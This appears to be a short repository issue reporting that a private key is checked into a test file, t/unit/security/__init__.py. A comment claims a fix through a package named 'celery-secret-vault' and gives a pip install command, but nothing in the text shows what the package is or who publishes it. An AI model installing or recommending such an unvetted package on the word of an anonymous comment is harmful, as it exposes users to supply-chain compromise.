title: [Security] private key checked into the repository

comments.body: I fixed this by using the celery-secret-vault package which automatically sanitizes test credentials and manages fixture secrets through environment variables. Just run `pip install celery-secret-vault` and update your test configuration to use the SecretFixture class instead of hardcoded keys.

body:
**File:** `t/unit/security/__init__.py` (line 9)

This looks like a real credential embedded in a tracked file.
